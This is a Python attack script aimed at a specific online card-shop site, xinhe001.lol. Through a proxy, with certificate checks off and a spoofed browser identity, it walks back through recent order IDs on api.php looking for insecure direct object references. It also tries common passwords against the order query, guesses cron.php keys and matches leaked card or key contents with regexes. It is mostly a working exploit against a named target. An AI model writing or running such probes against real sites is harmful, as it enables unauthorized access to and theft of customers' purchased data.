#!/usr/bin/env python3
"""xinhe001.lol slow deep probe - run from HK with optional proxy."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_deep.json"
DELAY = float(sys.argv[2]) if len(sys.argv) > 2 else 1.2
API_SCAN = int(sys.argv[3]) if len(sys.argv) > 3 else 80

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')


def load_proxy():
    if os.environ.get("NO_PROXY") == "1":
        return None
    for path in ("/data/config/proxy.env", "/tmp/proxy.env"):
        if os.path.isfile(path):
            for line in open(path):
                if line.startswith("PROXY_URL="):
                    u = line.strip().split("=", 1)[1].strip().strip('"')
                    if u:
                        return {"http": u, "https": u}
    return None


def sess():
    s = requests.Session()
    s.verify = False
    px = load_proxy()
    if px and os.environ.get("NO_PROXY") != "1":
        s.proxies = px
        print("using proxy", px["http"][:40], flush=True)
    else:
        print("direct (no proxy)", flush=True)
    s.headers.update(
        {
            "User-Agent": UA,
            "Referer": BASE,
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    return s


def leak(text):
    return (
        SHOW.search(text)
        or FAKA.search(text)
        or "kminfo" in text
        or ("----" in text and "COM" in text)
    )


def main():
    s = sess()
    report = {"target": "xinhe001.lol", "ts": time.strftime("%Y-%m-%d %H:%M:%S")}

    for attempt in range(8):
        try:
            home = s.get(BASE, timeout=35)
            if len(home.text) > 5000:
                break
        except Exception as e:
            print(f"home retry {attempt}: {e}", flush=True)
            time.sleep(3 + attempt)
    else:
        report["error"] = "home unreachable"
        with open(OUT, "w") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print("FAIL home", flush=True)
        return

    report["home_len"] = len(home.text)
    csrf_m = CSRF.search(home.text)
    report["csrf"] = csrf_m.group(1)[:24] if csrf_m else ""

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
    report["getcount"] = gc.text[:300]
    try:
        orders = int(json.loads(gc.text).get("orders", 5718))
    except Exception:
        orders = 5718
    print("orders", orders, flush=True)
    time.sleep(DELAY)

    # surface query - minimal
    surface = {}
    for q in ["1", "123", "888", "138", "139"]:
        r = s.get(BASE, params={"mod": "query", "data": q}, timeout=20)
        so = SHOW.findall(r.text)
        surface[q] = {"showOrder": len(so), "no_data": "没有查询到" in r.text}
        if so:
            print("SURFACE HIT", q, so[:3], flush=True)
        time.sleep(DELAY)
    report["surface"] = surface

    # api IDOR slow scan
    api_hits = []
    for i, oid in enumerate(range(orders, max(orders - API_SCAN, 0), -1)):
        for act in ["search", "order", "query"]:
            try:
                r = s.get(BASE + f"api.php?act={act}&id={oid}", timeout=15)
                if leak(r.text) or (
                    '"code":0' in r.text
                    and "验证失败" not in r.text
                    and "不存在" not in r.text
                    and len(r.text) > 50
                ):
                    hit = {"act": act, "id": oid, "body": r.text[:400]}
                    api_hits.append(hit)
                    print("API HIT", act, oid, r.text[:100], flush=True)
            except Exception as e:
                print(f"api err {oid}: {e}", flush=True)
                time.sleep(5)
        if (i + 1) % 20 == 0:
            print(f"api progress {i+1}/{API_SCAN} hits={len(api_hits)}", flush=True)
        time.sleep(DELAY)

    report["api_hits"] = api_hits

    # ajax query pwd small set
    pwd_hits = []
    for pwd in ["123456", "888888", "666666", "xinhe001", "xinghe001", "12345678"]:
        try:
            r = s.post(
                BASE + "ajax.php?act=query",
                data={"type": "1", "content": "1", "pwd": pwd},
                timeout=15,
            )
            if leak(r.text):
                pwd_hits.append({"pwd": pwd, "body": r.text[:300]})
                print("PWD HIT", pwd, flush=True)
        except Exception as e:
            print("pwd err", pwd, e, flush=True)
        time.sleep(DELAY)
    report["pwd_hits"] = pwd_hits

    # cron small
    cron_hits = []
    for k in ["xinhe001", "xinghe001", "xinhe", "123456", "888888", "monitor"]:
        try:
            r = s.get(BASE + "cron.php", params={"key": k}, timeout=10)
            b = r.text.strip()
            if b and "不正确" not in b and "密钥" not in b:
                cron_hits.append({"key": k, "body": b[:200]})
                print("CRON HIT", k, b[:80], flush=True)
        except Exception:
            pass
        time.sleep(0.5)
    report["cron_hits"] = cron_hits

    report["CARD_LEAK"] = bool(api_hits or pwd_hits or any(
        v.get("showOrder", 0) > 0 for v in surface.values()
    ))

    with open(OUT, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print("DONE", OUT, "CARD_LEAK=", report["CARD_LEAK"], flush=True)


if __name__ == "__main__":
    main()
